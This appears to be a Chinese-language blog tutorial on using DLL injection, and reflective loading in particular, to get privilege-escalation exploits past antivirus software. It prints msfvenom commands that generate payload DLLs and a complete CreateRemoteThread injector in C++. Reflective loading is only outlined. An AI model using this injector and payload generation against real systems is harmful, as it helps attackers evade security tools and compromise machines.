# CS插件之DLL反射加载EXP绕过AV提升权限

## 0x0 前言
本文旨在分享一些实践经验，探讨如何规避常见的反病毒软件（AV）对提权漏洞利用程序（EXP）的拦截。虽然不会深入探讨技术原理，但会尽量阐明相关技术的基本框架和核心步骤，使即使是初学者也能轻松理解并实践。

## 0x1 DLL注入概念
### 概述
DLL注入是一种编程技术，通过强制目标进程加载一个动态链接库（DLL），使其在目标进程的地址空间中执行特定代码。这种技术常用于改变原程序的行为，实现预期外的功能，如hook系统调用、读取密码框内容等。能够将任意代码注入到任意进程中的工具被称为DLL注入器。

### 功能与应用
合理地使用DLL注入不仅可以修改程序行为，还能动态扩展其功能，增强原有程序的能力。

## 0x2 DLL注入方式
本节主要介绍两种注入方法，并对比它们之间的差异以助于学习。

### 0x2.1 常规DLL注入
常规DLL注入通常采用远程线程注入(`CreateRemoteThread`)的方式进行。
- **步骤**:
  1. 打开目标进程的句柄。
  2. 在目标进程中分配内存，存放待注入DLL文件路径。
  3. 获取`LoadLibrary`函数地址。
  4. 使用`CreateRemoteThread`创建远程线程，并通过该线程调用`LoadLibrary`加载指定DLL。

> 核心思想在于：由于注入器进程无法直接访问目标进程内存，因此需要在目标进程中放置DLL路径，再利用固定位置的`LoadLibrary`API完成加载过程。

### 示例代码
使用Visual Studio 2019编写简单的DLL `hello.dll`，并在`DllMain`函数中添加消息框显示。如果安装了`msfvenom`，则可以更便捷地生成恶意DLL：
```bash
msfvenom -p windows/exec cmd=calc.exe -f dll -o calc32.dll # 生成32位dll
msfvenom -p windows/x64/exec cmd=calc.exe -f dll -o calc64.dll # 生成64位dll
```

接下来开发注入器程序，关键API包括但不限于`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`等。以下是一个简化的注入器示例：

```cpp
#include <windows.h>
#include <iostream>

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "Usage: DllInject <PID> <PathToDLL>\n";
        return 1;
    }

    DWORD pid = std::stoi(argv[1]);
    const char* dllPath = argv[2];

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "Failed to open process.\n";
        return 1;
    }

    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remoteAddr, (LPVOID)dllPath, strlen(dllPath) + 1, NULL);

    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    LPTHREAD_START_ROUTINE loadLibAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, loadLibAddr, remoteAddr, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

### 0x2.2 反射式DLL注入
相比于传统方法，反射式注入更加隐蔽，因为它不需要将DLL文件写入磁盘即可运行，仅存在于内存中，从而难以被检测工具发现。然而，这种方法实现起来更为复杂。

#### 工作机制
反射式注入的关键在于让DLL自行负责自身的加载过程，减少了对外部资源的依赖。这通常涉及解析PE头信息、修复重定位表以及处理导入表等功能。

#### 实现细节
- 利用已有的开源项目如[ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)作为参考。
- 通过自定义的加载器来完成从内存映射到实际执行的所有步骤。

以上便是关于如何通过不同类型的DLL注入技术来尝试绕过安全软件检测的方法概述。希望这些信息对你有所帮助！